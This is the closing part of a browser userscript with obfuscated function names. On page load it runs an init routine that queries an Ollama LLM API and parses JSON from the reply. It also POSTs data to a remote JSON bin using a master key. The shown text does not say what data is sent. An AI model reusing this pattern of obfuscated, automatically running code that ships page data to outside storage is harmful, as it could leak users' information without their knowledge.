                headers: { "Content-Type": "application/json", "X-Master-Key": BIN_KEY },
                data: JSON.stringify(data),
                onload: (res) => resolve(res.status >= 200 && res.status < 300),
                onerror: () => resolve(false)
            });
        });
    }

    function _0x4f31(prompt) {
        return new Promise((resolve, reject) => {
            GM_xmlhttpRequest({
                method: "POST",
                url: API_URL,
                headers: { "Authorization": "Bearer " + OLLAMA_API_KEY, "Content-Type": "application/json" },
                data: JSON.stringify({ model: MODEL_NAME, messages: [{"role": "user", "content": prompt}], stream: false, temperature: 0.1 }),
                onload: (res) => {
                    try { resolve(JSON.parse(res.responseText).message.content); } catch (e) { reject(e); }
                },
                onerror: () => reject("Fail")
            });
        });
    }

    function _0x21c0(ans) {
        let match = ans.match(/```(?:json)?\s*(\{[\s\S]*?\})\s*```/i);
        let jsonStr = match ? match[1] : ans;
        return JSON.parse(jsonStr.replace(/'/g, '"'));
    }

    function _0x1a83() {
        if (document.getElementById(_0x2b8e(11))) return;
        _0x11a5();
        _0x163f();
        _0x15f1();
        setTimeout(_0x104d, 3000);
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(_0x1a83, 1000);
    } else {
        window.addEventListener('load', () => setTimeout(_0x1a83, 1000));
    }
})();
